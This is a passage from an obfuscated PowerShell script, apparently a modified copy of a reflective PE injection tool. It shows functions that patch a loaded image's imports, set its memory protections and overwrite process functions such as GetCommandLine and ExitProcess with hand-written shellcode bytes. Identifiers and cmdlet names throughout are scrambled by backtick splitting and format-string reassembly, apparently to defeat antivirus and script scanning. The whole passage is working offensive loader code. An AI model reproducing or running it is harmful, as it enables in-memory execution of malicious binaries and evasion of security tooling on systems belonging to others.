                        [IntPtr]${nEW`T`HUnkr`ef} =  &(  "{1}{0}{2}{3}{5}{4}" -f't-R','Ge','emo','t','s','eProcAddres') -RemoteProcHandle ${r`e`mOteproc`HA`NDLE} -RemoteDllHandle ${ImpOR`TDLl`haNd`Le} -FunctionName ${p`ROCeDu`RenAME}
                    }
                    else
                    {
                        if(${P`ROcedureNa`ME} -is [string])
                        {
                            [IntPtr]${NEWTHUN`K`ReF}   = ${W`In`3`2Functi`ons}."GETpR`OC`ADdress"."i`Nvoke"( ${ImpOrTDllHa`N`dle}, ${prO`ceDu`R`E`NAme}  )
                        }
                        else
                        {
                            [IntPtr]${NE`W`ThunkREF}  =   ${W`I`N32FuNcT`iOnS}."GETPr`OcADDre`s`S`o`RDiNAL"."inV`o`kE"(  ${I`mpORtDLLh`A`NDlE}, ${PrO`cedu`REnaME})
                        }
                    }

                    if (  ${nEw`T`hUNKref} -eq ${n`Ull} -or ${n`e`wtHUn`kref} -eq  $wjag7::"z`ERO")
                    {
                        Throw "Modified: New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                    }

                     (  VARIABlE ( 'A' +'l9j'  ) -valU    )::("{1}{2}{3}{0}"-f'Ptr','St','ructu','reTo').Invoke(  ${ne`WTh`U`NkrEF}, ${T`hu`NKreF}, ${f`A`LSe}  )

                    ${t`HUN`KREf}   =  &  ( "{3}{1}{4}{2}{5}{0}" -f 'd','dd-','AsU','A','SignedInt','nsigne') ([Int64]${thUnK`R`EF} ) (  (    LS  VariABle:al9J).vAlUE::"Siz`E`of"( [Type][IntPtr] )  )
                    [IntPtr]${or`IG`iN`Alt`HuNkReF}  =  &(  "{1}{2}{3}{0}" -f'ned','A','dd-SignedIntAsUns','ig') ( [Int64]${O`RIGI`NA`Lt`hUNkref}) (   $AL9j::"S`ize`OF"( [Type][IntPtr]))
                    [IntPtr]${o`RigiNaLt`Hu`Nkr`EF`VAl}   =     $AL9J::"ptR`T`OS`TRUcTUre"( ${O`R`iGInalTHUNkr`Ef}, [Type][IntPtr])
                }

                ${I`mPORTDeSC`RI`p`ToRPtR}  =   &("{1}{3}{4}{2}{5}{0}"-f 'd','Add-SignedI','sig','ntA','sUn','ne'  ) (  ${Im`Po`RTdeS`crI`PT`orPtr} ) (    $al9j::"Si`ZE`OF"([Type]${w`IN3`2typ`eS}."ImAGE_imPoRT`_DEscri`P`TOr"))
            }
        }
    }

    Function G`Et-ViR`TU`AlP`RoTeC`TVAl`UE
    {
        Param(
        [Parameter(  pOsitioN  = 0, MANdAtoRY =   ${t`RUE} )]
        [UInt32]
        ${sec`TI`oNcHa`R`ActER`Is`TIcS}
        )

        ${PR`OTEC`TiOnfl`Ag} = 0x0
        if (  (  ${s`eCt`ionChAr`AC`Ter`ISti`CS} -band ${WIn32COn`StaN`TS}."i`mAg`e_`Scn_mE`M_`EXeCu`TE") -gt 0)
        {
            if ( (  ${sEC`TioncHaR`AC`TERisTicS} -band ${w`In`32ConSta`N`Ts}."iMage_scn`_`m`EM_ReAd"  ) -gt 0 )
            {
                if (  (${sec`TIONCha`RaCTeRis`TI`CS} -band ${wIn`32`C`ONSTaN`TS}."iM`AG`e_Scn_mEM_Wr`ItE") -gt 0 )
                {
                    ${pRo`T`eCTI`ONflag}  =   ${wi`N32CONst`A`NTS}."pagE_exeC`Ut`e_`RE`AdWR`ITE"
                }
                else
                {
                    ${PRot`ECtioNFL`Ag}   =   ${wi`N3`2C`oNsTanTS}."pa`GE_E`XEcutE_R`EAD"
                }
            }
            else
            {
                if (  (  ${SeCtiOn`c`HAra`CT`ER`IsTi`cs} -band ${w`In3`2co`NsTAnTs}."Imag`E_scN`_`Mem`_`WriTe") -gt 0)
                {
                    ${p`ROTEC`T`ioNfl`Ag} =   ${w`i`N32cO`NStANTS}."PAGE_ExECUTE_wr`i`T`E`c`OPY"
                }
                else
                {
                    ${prO`Te`CTion`FlAg}   = ${win32co`N`stANTS}."Page`_e`xEcuTe"
                }
            }
        }
        else
        {
            if (  ( ${SECTiOnc`HaRA`c`T`EriS`Ti`CS} -band ${WI`N32`Con`STa`NTS}."imaGe`_`s`cn`_MEM_`Read") -gt 0)
            {
                if (  ( ${Sec`T`io`N`cha`RA`Cte`RistiCS} -band ${WIN32`co`NST`A`NTS}."imAge`_sC`N_M`EM`_wRite" ) -gt 0 )
                {
                    ${PRotECT`I`ONFlaG}  =  ${W`in32C`oNS`TaNts}."PagE_`REAdwr`ItE"
                }
                else
                {
                    ${Pr`oTEct`i`OnfL`Ag}   = ${wIN32`cO`N`StA`NTS}."PAGE_RE`A`d`On`LY"
                }
            }
            else
            {
                if (  (${seCti`On`cHaRa`c`TeRIs`TI`Cs} -band ${Win`32Con`St`AN`TS}."i`Ma`ge_sCn`_MEm_`w`RiTe") -gt 0 )
                {
                    ${Pr`Ot`ectIO`Nf`lAG}   =  ${WI`N`32CONsTA`NTS}."p`AGE_wRiT`EC`oPy"
                }
                else
                {
                    ${PROt`ec`TIo`NFL`Ag}   = ${wi`N32`CoN`sTAn`Ts}."paG`E`_NOa`ccesS"
                }
            }
        }

        if (  (${sEcti`o`NCHAra`C`TERi`ST`Ics} -band ${w`i`N32c`OnsTaNTs}."imaGE_`SCn_Mem_n`oT_Ca`c`hED") -gt 0)
        {
            ${PRot`eCT`IO`NflaG} =   ${PROTE`C`TiONFlag} -bor ${win3`2C`oNs`T`AnTs}."P`AG`E_`NOCAchE"
        }

        return ${p`RoTeC`TiO`N`FlAg}
    }

    Function U`Pd`A`TE-mEm`OryP`RotECTIO`NFLAGs
    {
        Param( 
        [Parameter( PoSItiOn   = 0, maNdaTORY  =   ${tR`Ue}  )]
        [System.Object]
        ${P`einFo},

        [Parameter(PosITiOn  =   1, MAnDatoRY  = ${T`Rue}  )]
        [System.Object]
        ${wIn`32FuNc`TioNS},

        [Parameter( poSITION =  2, MANdAtORY  =   ${T`RuE})]
        [System.Object]
        ${Win32C`OnS`T`A`NTs},

        [Parameter(  PoSItiON   = 3, mANDAtoRy   =   ${Tr`Ue} )]
        [System.Object]
        ${w`iN3`2`TyPES}
         )

        for(   ${i}  = 0 ; ${I} -lt ${P`EInFO}."IM`AGe`_NT`_Heade`RS"."FiLe`HEA`DER"."nuMbE`ROf`Sec`TIons" ;   ${I}++ )
        {
            [IntPtr]${Sect`IonHeAder`p`TR}   = [IntPtr]( & ("{5}{3}{1}{6}{2}{0}{4}" -f 'nsi','I','AsU','dd-Signed','gned','A','nt' ) ([Int64]${Pe`iNFO}."SECTIO`N`HEad`ErPTr") (  ${i} *  $aL9J::"si`zE`of"([Type]${wIN`32`TYPEs}."iMaGE_`SecTIOn`_`he`Ader"  )))
            ${SEC`Ti`On`hE`AdeR} =     (childIteM (  'vARiaB'+'lE' +':AL9j' )  ).VaLUE::"ptrT`o`sTRUCTURe"(  ${SeC`T`i`onheADEr`pTR}, [Type]${W`i`N32T`YPes}."IMaGE`_SE`ct`iO`N_`Hea`dEr"  )
            [IntPtr]${sec`Ti`OnpTr}   =    & ( "{4}{0}{2}{1}{3}{5}" -f 'S','IntAsUns','igned','ig','Add-','ned'  ) (${p`Ein`Fo}."Pe`hAndLE") (${s`Ec`TionH`eAdEr}."viR`T`UaLadDRE`SS")

            [UInt32]${prOT`ecT`F`Lag}  =  & ( "{1}{4}{3}{2}{5}{6}{0}"-f 'ue','Ge','ot','tualPr','t-Vir','ec','tVal') ${seCTi`OnHe`A`DER}."Ch`ArActERI`SticS"
            [UInt32]${seCtio`N`si`Ze} =  ${sec`T`IONhEa`DER}."ViRt`U`ALsizE"

            [UInt32]${oLD`P`RO`T`EctfLag}   = 0
             &  ( "{3}{4}{1}{5}{6}{0}{2}" -f'li','yRang','d','Tes','t-Memor','eV','a'  ) -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo ${Pei`N`FO} -StartAddress ${S`E`Ction`Ptr} -Size ${Se`cT`i`oNSiZe}  |  &("{0}{2}{1}"-f 'Out-','ull','N'  )
            ${SuC`c`eSs}  = ${Wi`N32`FUNctIo`Ns}."Vir`TUalpr`OT`ECT"."Inv`oKe"(${s`ecTiOnp`TR}, ${sECT`ION`s`iZE}, ${protEC`T`FLaG}, [Ref]${Old`prOt`ectFl`AG} )
            if (  ${SUc`C`ess} -eq ${Fa`LsE}  )
            {
                Throw "Modified: Unable to change memory protection"
            }
        }
    }

   
   
    Function Up`datE-exeF`U`Nc`TIoNS
    {
        Param( 
        [Parameter(  PosITiON =  0, MANdATOry   = ${t`RUE}  )]
        [System.Object]
        ${Pe`i`NFO},

        [Parameter(  PosITiON  = 1, MAnDatORY   =  ${T`RUe} )]
        [System.Object]
        ${w`IN`3`2`FunctIoNs},

        [Parameter(pOsiTIoN = 2, mANdAToRy  =   ${T`RUE})]
        [System.Object]
        ${win32`c`O`NsTAn`TS},

        [Parameter(  posiTION   =   3, MandAtory   =  ${TR`Ue})]
        [String]
        ${ex`e`A`RGumen`TS},

        [Parameter(  posItiON   =  4, maNDatory   = ${TR`UE} )]
        [IntPtr]
        ${ExE`DoN`e`B`ytEPTr}
        )

       
        ${R`ETURnaR`RAY}   =   @()

        ${ptrSI`zE}   =     $AL9j::"S`izeOF"([Type][IntPtr]  )
        [UInt32]${OldP`Rote`Ct`FlaG}  =  0

        [IntPtr]${KErN`eL`32hANdle}   = ${win`32FUN`CtI`o`NS}."Get`mOdUl`EH`AnD`le"."in`V`oke"("Kernel32.dll" )
        if (  ${KeRNEL3`2Ha`N`DLE} -eq   ( gI vaRIAble:WJAg7  ).vALue::"z`erO"  )
        {
            Throw "Modified: Kernel32 handle null"
        }

        [IntPtr]${K`er`NeL`BASEH`An`DLe}  =   ${WI`N`32FuNCTi`onS}."GETmOD`ULEhA`N`dle"."I`NvOKE"("KernelBase.dll"  )
        if ( ${k`eRN`eLbaSe`hA`NDlE} -eq   (    Gci  ( 'vA'+  'RIabL'+  'e:'  + 'wj'  + 'AG7'  )   ).ValUe::"Z`ERo" )
        {
            Throw "Modified: KernelBase handle null"
        }

       
       
       
        ${c`MDL`IN`eWarG`SpTr}  =   (  gET-iTeM  VAriABle:AL9J ).vALUE::(  "{5}{1}{0}{2}{4}{3}" -f'HG','ngTo','l','balUni','o','Stri'  ).Invoke(  ${E`xeA`Rg`UmEntS})
        ${CmDLi`N`e`A`ArgsP`TR}  =  $aL9j::("{1}{2}{3}{0}"-f 'GlobalAnsi','Str','ingT','oH'  ).Invoke(  ${E`XE`A`RgUMeNTs})

        [IntPtr]${G`eTC`oMm`A`NDLiNEAa`dDR}  = ${WIn32F`UnCtI`ons}."GE`TpR`OCaddR`e`ss"."I`NVOKe"(  ${kE`RNel`BASe`HanD`LE}, "GetCommandLineA"  )
        [IntPtr]${gETCommAnD`l`I`NE`wAddR}  = ${WIn32`F`U`NcTIo`Ns}."GETP`ROCaD`DR`esS"."In`VO`ke"(  ${k`e`RnElB`A`SeHAnd`le}, "GetCommandLineW" )

        if (${G`eT`ComMAN`DLi`NeAad`dR} -eq   (   chIlDItem ('VA' + 'Riab'  +  'LE:wjA' + 'g' + '7' )   ).valuE::"Ze`Ro" -or ${g`e`TCoMMAnDL`INe`WaDdR} -eq  $wJaG7::"ze`RO")
        {
            Throw "Modified: GetCommandLine ptr null. GetCommandLineA: $GetCommandLineAAddr. GetCommandLineW: $GetCommandLineWAddr"
        }

       
        [Byte[]]${S`He`LLcode1}   =  @( )
        if (  ${PtR`S`iZE} -eq 8)
        {
            ${sh`EL`LCO`de1} += 0x48
        }
        ${S`HeLlc`ode1} += 0xb8

        [Byte[]]${S`HelLcOd`E2}   =   @(0xc3  )
        ${T`OtAl`SiZe}   =  ${sH`E`lLC`OdE1}."Le`Ng`Th" +  ${p`TrS`ize}  +   ${She`l`lCODE2}."lEn`GtH"


       
        ${gETco`MMAnDl`INeAor`IGbY`TEsp`TR}  =     (gET-vArIaBle Al9j  ).VALue::(  "{1}{0}{3}{2}"-f'llo','A','Global','cH').Invoke( ${TO`TAlsi`ZE} )
        ${gE`TComm`ANDlIN`eWo`RIGBY`Te`sP`TR}  =     (   get-vAriABle  AL9j -valu    )::(  "{1}{2}{3}{0}"-f 'bal','Al','loc','HGlo'  ).Invoke( ${toT`ALsI`Ze}  )
        ${wi`N32FuN`c`T`IoNs}."me`mcpY"."Inv`oKe"( ${gEtcOm`mAnD`lINEa`OR`I`gb`Yte`sptR}, ${gE`TcOMMa`NdliNE`Aa`d`Dr}, [UInt64]${To`TA`lSiZE} ) |    & (  "{2}{1}{0}" -f '-Null','ut','O' )
        ${WIN32`F`UnC`TIOnS}."M`Em`cPy"."I`Nv`oKe"(  ${GETco`mMANdLIn`eWo`RiGB`ytEsptr}, ${Ge`TCOMMandL`iN`eWAd`DR}, [UInt64]${TO`T`ALsI`Ze} )   |  &  ("{1}{0}"-f'l','Out-Nul')
        ${reTu`RnAR`Ray} += ,( ${gEtcoMm`A`N`d`LIn`e`AaDDr}, ${ge`TCommAnDl`i`N`E`A`oriGbY`TEsPtR}, ${to`Talsi`zE} )
        ${Re`TU`RNAR`RaY} += ,(${get`COmmaNdlIN`E`W`ADdR}, ${GEt`c`OMmaN`dLinewOri`gbyT`eSp`TR}, ${TO`Ta`Lsi`Ze})

       
        [UInt32]${O`Ld`PR`otecTfl`AG}  = 0
        ${S`UcCEss}   = ${wIN`3`2fUnctI`oNS}."ViRt`UAl`pRO`Te`cT"."i`Nv`OKE"( ${get`C`ommANDli`NEAA`dDR}, [UInt32]${toTa`L`S`izE}, [UInt32]( ${wi`N32`cONsTaN`Ts}."pA`G`E_`eXECuTE_re`Adw`Rite" ), [Ref]${oLdp`RO`Tec`TF`laG})
        if (${SuCc`eSS}   =   ${FA`LsE}  )
        {
            Throw "Modified: Call to VirtualProtect failed"
        }

        ${g`etcOm`MaNDlI`NeA`A`ddrt`EmP}  =   ${G`e`TCommAnd`liN`EA`A`DDR}
        & (  "{0}{4}{3}{2}{1}"-f'Wr','ory','Mem','te-BytesTo','i'  ) -Bytes ${sHEL`l`coD`e1} -MemoryAddress ${gEtc`oMMan`D`l`i`NeaadDr`T`emP}
        ${GETc`o`MmandLiNeaADd`RT`e`mP}  =   & ( "{3}{2}{0}{4}{1}" -f'edIn','Unsigned','gn','Add-Si','tAs' ) ${GE`TCo`m`MANdL`IneaADD`RtEmp} (  ${SheLl`C`ode1}."Len`G`TH"  )
          $Al9j::("{0}{1}{2}{3}"-f 'Str','u','ctureTo','Ptr'  ).Invoke(  ${C`mDLiNE`Aa`RG`SpTR}, ${gE`TcOmM`A`ND`l`i`NEAadDRteMP}, ${FAL`se} )
        ${GetcOmM`AND`L`I`NEAAD`drt`E`MP} =   &  ("{1}{4}{6}{5}{3}{0}{2}" -f'Unsigne','A','d','s','dd-Signed','A','Int') ${getcOM`MAn`Dl`I`NEa`ADd`R`TeMp} ${PT`RS`IzE}
        &( "{1}{4}{2}{0}{3}" -f'emor','Write-By','sToM','y','te'  ) -Bytes ${s`HE`LlCO`DE2} -MemoryAddress ${GeTCO`MManDli`NE`AaDdr`Te`Mp}

        ${w`In32f`U`NCT`IOns}."v`i`Rt`Ua`lPrOTEcT"."i`Nvo`kE"(${GEt`CoMm`A`N`dlInE`AAddR}, [UInt32]${T`OTAL`SiZe}, [UInt32]${o`lDProt`eCtF`lAg}, [Ref]${OLdpR`o`TEC`T`Flag}) |  &("{0}{1}"-f 'Out','-Null'  )


       
        [UInt32]${O`LdprO`TECTf`L`Ag} = 0
        ${SU`cCeSs} = ${WIN3`2`FUNC`TioNs}."VIR`T`Ual`prot`eCt"."I`NvOkE"( ${G`eTCo`mMANDL`I`NEw`AdDR}, [UInt32]${tOtAl`S`i`zE}, [UInt32]( ${WI`N32C`On`S`TaNTs}."PAge`_ExEC`UT`E_rE`ADWritE"), [Ref]${olDpR`OTE`CTfl`Ag}  )
        if ( ${suc`CeSs}   = ${FAL`sE}  )
        {
            Throw "Modified: Call to VirtualProtect failed"
        }

        ${GeTC`o`MM`Andli`NEWa`DD`RTeMP}   = ${GET`CoM`mANDlIN`eWaD`Dr}
        &("{2}{1}{0}{3}" -f 'ToMemor','-Bytes','Write','y'  ) -Bytes ${sh`E`Llco`De1} -MemoryAddress ${gE`Tcommand`LIne`W`A`ddrTEmP}
        ${g`e`TCoMManDLI`Ne`WaddrTeMP}  =   & ("{5}{4}{2}{3}{1}{0}{6}" -f'i','ns','A','sU','nedInt','Add-Sig','gned'  ) ${G`E`TcOM`MAnDl`i`NeW`AddrteMp} (${sHe`LLCo`D`E1}."Le`NGTH"  )
          (   vAriABlE (  "aL9" +  "J" ) ).vaLuE::( "{3}{0}{4}{1}{2}" -f'tru','ture','ToPtr','S','c'  ).Invoke( ${cmdlIn`eWaR`G`spTR}, ${G`E`TCO`MMa`NDlINeWAD`drtemp}, ${fAL`sE} )
        ${g`ETc`Om`Ma`NDLINewAD`dr`TEmP} =  &(  "{2}{5}{0}{4}{1}{3}{6}"-f 'Sign','IntAsU','Ad','nsig','ed','d-','ned'  ) ${gE`T`CO`mM`A`NDliN`ewadDr`TeMP} ${P`TrSIZE}
        &( "{3}{1}{2}{5}{0}{4}"-f'Me','rite-By','tesT','W','mory','o'  ) -Bytes ${sh`e`llCoDe2} -MemoryAddress ${GETCo`M`ManDL`IneWad`Dr`TeMP}

        ${WIN3`2F`UnCTiO`NS}."v`i`RTUa`LPR`oTecT"."iNVO`ke"(  ${GetCo`MM`An`DLIN`E`WadDr}, [UInt32]${T`ot`AlsizE}, [UInt32]${O`l`dp`RO`TecTFLAg}, [Ref]${Ol`DPRoT`EcTFL`Ag} )   |   &  (  "{1}{2}{0}" -f'Null','O','ut-')
       


       
       
       
       
       
        ${Dll`Li`St}   =   @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
            , "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")

        foreach (  ${d`LL} in ${dlL`LI`sT})
        {
            [IntPtr]${d`LLhaN`Dle} = ${wi`N3`2fUNcTioNS}."g`et`ModuLEH`ANdlE"."INvo`Ke"(  ${D`LL} )
            if (${DLLh`A`ND`le} -ne   $wjag7::"z`ero" )
            {
                [IntPtr]${WC`MD`LnAD`Dr}   =  ${Win32FU`N`Cti`oNS}."ge`TPR`ocA`DdrESs"."IN`V`OKe"(  ${DL`lh`ANDLE}, "_wcmdln")
                [IntPtr]${aC`MD`l`NAddr}  =   ${W`IN`3`2fuNcTIONS}."GeT`pRO`caDDresS"."in`Vo`ke"(  ${d`L`LhANDlE}, "_acmdln" )
                if (${WcMD`L`N`ADdR} -eq  $wJaG7::"Ze`RO" -or ${AC`M`dLnaDDR} -eq  (  GI  (  "VAri"  +  "ABLE"+":wJag7")  ).vaLuE::"Z`Ero"  )
                {
                    " MODIFIED: Error, couldn't find _wcmdln or _acmdln"
                }

                ${neWAc`mdLN`PTr} =    $al9j::(  "{4}{2}{0}{3}{1}"-f'ring','oHGlobalAnsi','t','T','S').Invoke(  ${Ex`EAR`Gum`ENtS})
                ${nEW`w`Cmdln`Ptr}   =   (   varIAbLE ("A"+"l9j" )  -vAlUEon )::("{1}{3}{0}{4}{2}" -f 'ingToHGlob','S','ni','tr','alU' ).Invoke(  ${eX`e`ARGUME`N`TS}  )

               
                ${orI`GaCMd`L`NpTr}  =    $aL9j::"pTr`TO`sT`RUCtuRe"(${A`cm`DLNAddr}, [Type][IntPtr])
                ${or`I`GwcmdlNPtR}  =    $aL9j::"PtRt`OsT`RuCtuRe"( ${wCmD`Lnad`DR}, [Type][IntPtr]  )
                ${OR`i`gaCM`d`lnP`TRst`ORage}  =   (  Get-vArIablE  ('a'+'L9j' ) -vALueoN   )::(  "{1}{0}{2}"-f 'l','Al','ocHGlobal'  ).Invoke(${pT`RSi`ZE} )
                ${OrigwCmD`l`NPTr`sTOrAge}   =    ( GET-vARiaBLe  ( 'a'+'L9J' )   ).Value::(  "{3}{2}{1}{0}"-f'l','ba','llocHGlo','A').Invoke( ${pTrS`I`zE} )
                  $AL9j::("{3}{1}{0}{2}{4}"-f 'ctureT','u','oP','Str','tr').Invoke(${O`RiGa`cmdLnpTr}, ${OR`igac`mD`L`NPTR`st`OragE}, ${f`ALSe} )
                 ( GET-chILdITeM  vArIABlE:aL9j    ).VaLUE::( "{1}{0}{2}"-f'uc','Str','tureToPtr' ).Invoke(${o`Ri`GWCmDlnpTr}, ${ORI`GW`CmdL`NPTrS`TORAGE}, ${Fal`Se} )
                ${R`EtUr`Nar`RaY} += ,(${ac`m`dLNad`DR}, ${orig`ACmdl`N`PTr`stor`A`ge}, ${p`TRsi`Ze} )
                ${REtuRNa`R`RAy} += ,(${wC`md`lna`dDR}, ${ORigW`cmdLnpTrs`T`oRagE}, ${pt`RsI`zE})

                ${sUC`cEsS}   =   ${Win32F`UNcT`iO`NS}."virTualPRO`Te`CT"."IN`Voke"(${Acm`DLna`Ddr}, [UInt32]${pt`R`SIZe}, [UInt32](  ${wIN32`c`oNSt`AnTS}."pAGe`_exeC`UTe_`REA`d`WRitE" ), [Ref]${olDpROt`E`ct`FlaG}  )
                if (${S`UcCE`Ss}   =   ${FAL`sE} )
                {
                    Throw "Modified: Call to VirtualProtect failed"
                }
                  $AL9J::("{2}{3}{1}{0}"-f 'r','uctureToPt','S','tr'  ).Invoke( ${N`Ew`AcMdL`NpTR}, ${AC`md`L`NADDr}, ${fA`lSE})
                ${W`IN3`2fu`Nc`TIons}."viR`TUaLp`R`Otect"."INV`OKE"(${Ac`Md`LnAddR}, [UInt32]${p`TrSI`ZE}, [UInt32](  ${O`LdPr`ote`CtFL`AG}), [Ref]${OLdprOt`e`C`TFLaG} ) |  & (  "{0}{1}{2}" -f 'O','u','t-Null')

                ${S`UcCe`SS}  =  ${WIn32F`U`N`ctionS}."ViRt`Ua`l`Pro`TECT"."iNV`OKE"(  ${WC`MdlN`A`ddr}, [UInt32]${P`T`RSizE}, [UInt32](${wIn3`2C`On`ST`ANTS}."pa`gE_EXeC`U`T`e_reADWrI`Te" ), [Ref]${O`l`dPrOtectF`Lag}  )
                if (  ${suCcE`SS} =   ${fAl`Se} )
                {
                    Throw "Modified: Call to VirtualProtect failed"
                }
                 (    chilDitEm ("VARIa" + "BLe:al9"+  "J" )  ).valUe::(  "{0}{4}{3}{1}{2}"-f 'Struct','eTo','Ptr','r','u').Invoke(${N`eww`Cm`dln`pTR}, ${W`cM`DLna`dDr}, ${Fa`lSe} )
                ${w`iN32F`Unct`iO`Ns}."ViR`T`U`Alp`ROteCt"."INvO`kE"(${wcmD`Ln`AddR}, [UInt32]${pT`R`SIze}, [UInt32](${olDPr`OT`e`CtfLAg}  ), [Ref]${OLdPROTECTF`L`Ag} )  |   &  ("{1}{0}"-f't-Null','Ou'  )
            }
        }
       


       
       

        ${RE`TU`Rn`ArrAY} = @( )
        ${EX`ItF`UNCT`io`NS} =   @()

       
        [IntPtr]${M`ScOr`EE`han`dlE}   = ${WiN32FUn`ct`IO`NS}."gETM`oD`Ul`Eha`NdLE"."iNv`O`Ke"( "mscoree.dll" )
        if (  ${ms`Co`REehaNd`LE} -eq  (Get-variAbLe  ( "Wj" +"ag7") ).vAluE::"z`ero" )
        {
            Throw "Modified: mscoree handle null"
        }
        [IntPtr]${co`RexiTpRO`CeSS`ADDR} =   ${Win32F`U`NctiO`NS}."G`ETP`Roc`AdD`RESS"."INv`okE"(  ${mS`c`OrEEhaN`dlE}, "CorExitProcess")
        if (  ${coReXITpRoc`e`S`SAd`dr} -eq  ( GCI ('v' +  'aRiABLE:wj'+'AG7' )   ).VaLUE::"z`ERO"  )
        {
            Throw "Modified: CorExitProcess address not found"
        }
        ${EXitf`UnC`Tio`NS} += ${corE`XITP`RoCe`SsA`ddr}

       
        [IntPtr]${ex`ITPr`O`CessAdDr} =   ${WI`N3`2`FU`NCTioNs}."ge`T`ProcAdDreSS"."iN`V`oke"(${KERn`eL32`hand`LE}, "ExitProcess")
        if ( ${exITP`ROCES`SAd`Dr} -eq   (  GEt-VARIABlE  wJAg7  -vAluEoN   )::"Ze`Ro" )
        {
            Throw "Modified: ExitProcess address not found"
        }
        ${EX`Itf`UnCt`io`NS} += ${EXI`T`PROcESs`A`ddr}

        [UInt32]${Oldp`ROT`ec`TFL`AG}   = 0
        foreach (${PR`o`ce`x`iTfu`NCTiona`ddr} in ${e`xiTfu`NctiO`Ns}  )
        {
            ${p`R`Ocex`ITfuNct`ioNad`Drtmp}  = ${PR`oC`eXI`T`FuNcTIONaDdr}
           
           
            [Byte[]]${S`hElLcO`De1}  =   @(0xbb  )
            [Byte[]]${sh`ElLCo`de2}  = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb )
           
            if (  ${p`TR`SIZE} -eq 8)
            {
                [Byte[]]${SHE`l`lCoD`e1}   =   @(0x48, 0xbb )
                [Byte[]]${S`HELl`cO`dE2}   = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb )
            }
            [Byte[]]${sh`El`LCo`De3}  = @(0xff, 0xd3 )
            ${toTA`ls`I`ZE} =  ${S`HeLL`COd`e1}."L`EngTH"  +  ${PtRsI`ZE}  + ${s`hEl`lCo`De2}."L`En`Gth" +  ${pt`Rs`ize}  +   ${s`HeLLcoD`e3}."le`NgTH"

            [IntPtr]${ex`ItTHR`ea`dADDR}  = ${w`IN`32fu`NCTio`Ns}."gETpROcA`D`dR`eSS"."INvo`ke"(  ${Ker`NEL3`2haND`lE}, "ExitThread" )
            if (  ${E`xitTh`READ`ADDR} -eq   $wjaG7::"Ze`Ro")
            {
                Throw "Modified: ExitThread address not found"
            }

            ${s`UcC`eSS} =  ${wIN32f`Unc`Ti`O`NS}."vI`RT`UALP`ROTE`Ct"."iNvO`Ke"( ${pr`o`CeXitfUN`c`TIO`N`ADdr}, [UInt32]${toTAl`s`iZe}, [UInt32]${w`iN`32co`NsT`AnTS}."pA`Ge_EX`EC`UTE_`R`eA`DWrITE", [Ref]${OLd`pR`OTeC`TflaG})
            if (  ${sUC`cE`Ss} -eq ${F`Alse})
            {
                Throw "Modified: Call to VirtualProtect failed"
            }

           
            ${Ex`It`ProcEsSoriG`B`yTEsPTR}  =    (  DIr  ("vaRi"  +"aB" +"lE:al"+  "9J"  )   ).VaLUE::(  "{2}{0}{1}"-f 'l','ocHGlobal','Al').Invoke(${tO`T`A`lsIZe} )
            ${Wi`N32FuN`cT`iOnS}."Me`mCPy"."i`Nv`oke"(  ${exI`TpRoCe`S`sO`R`igBY`TE`SPTR}, ${PRoCe`xiTFU`N`CtI`OnaDDr}, [UInt64]${TotAl`sI`ZE} ) |  & (  "{0}{1}" -f'Out-N','ull')
            ${ReT`URNa`RrAY} += ,( ${P`RO`cE`x`iTfUNcTI`ONADDR}, ${eX`i`TproCeS`S`orIgBYteSPTr}, ${TotA`L`SiZE} )

           
           
             &  ( "{3}{0}{2}{1}"-f 'Byt','Memory','esTo','Write-'  ) -Bytes ${SH`El`LcOD`e1} -MemoryAddress ${PrOCE`xi`T`Fu`NC`T`IONADd`RTMP}
            ${pr`ocEx`ITf`UnCtioNAd`dRt`Mp}  =  & ( "{0}{2}{5}{4}{3}{1}{6}"-f 'Add','ign','-','edIntAsUns','n','Sig','ed') ${pRO`C`eXItFu`NcT`IoNa`Dd`RtMp} ( ${SHELlc`oD`e1}."LEnG`Th")
             (  vAriable  al9J  ).vAluE::( "{1}{0}{2}{3}"-f't','S','r','uctureToPtr'  ).Invoke( ${EXedO`N`eb`YTEptR}, ${Pr`O`cE`xITf`UNcTi`ON`ADdrTMP}, ${fA`LSe} )
            ${pRo`C`EXiTfU`N`cti`ONAD`DRTMp}  =   & (  "{4}{2}{0}{1}{3}" -f'd','-SignedIntAsU','d','nsigned','A'  ) ${p`ROCE`XiTFUnct`Io`Na`d`dR`Tmp} ${P`TRS`izE}
             & ( "{1}{0}{5}{3}{2}{4}" -f 'te-Byte','Wri','oMemo','T','ry','s') -Bytes ${S`HELlC`od`e2} -MemoryAddress ${P`ROc`eXITF`UN`CTIona`D`DRtMP}
            ${PROcE`XiTfUNc`TI`oNaDD`Rtmp}  =   & ("{5}{4}{3}{1}{6}{0}{2}" -f 'nsig','IntA','ned','igned','dd-S','A','sU') ${p`RoC`e`XIt`FUNc`TionaDd`R`TmP} (${SHELL`CO`d`E2}."L`en`Gth"  )
              (lS ( 'VarIA'  +'BlE:a' + 'L9' + 'j'  )).VaLuE::("{2}{4}{0}{1}{3}"-f 'u','r','S','eToPtr','truct' ).Invoke(${e`XItT`hREaDa`dDr}, ${pR`O`cexIt`F`UNCT`iONAD`dRtmp}, ${FA`LSE}  )
            ${pRoceXit`F`Un`ct`iOnAddrTMP}  = &( "{2}{4}{3}{1}{0}" -f 'signed','tAsUn','A','edIn','dd-Sign') ${pRoCE`Xit`F`UNcTIo`NAddRTmp} ${PtRS`I`ZE}
            &  ( "{3}{1}{0}{4}{2}{5}" -f'y','-B','To','Write','tes','Memory' ) -Bytes ${s`H`ElLCOde3} -MemoryAddress ${pRo`cEX`ITfUn`C`TionaD`DRt`mP}

            ${wi`N`3`2`FunctIoNs}."vi`RtuA`l`pRo`TeCt"."IN`Vo`KE"( ${PROCExitF`UNC`Ti`o`NADDR}, [UInt32]${To`TaLsi`ze}, [UInt32]${oLd`PrOtEcT`FLAg}, [Ref]${OlDPRo`T`E`CtfLag} ) | &(  "{1}{2}{0}" -f 'll','Ou','t-Nu'  )
        }
       

         &("{2}{1}{0}" -f'Output','ite-','Wr'  ) ${rETurN`ArR`Ay}
    }


   
   
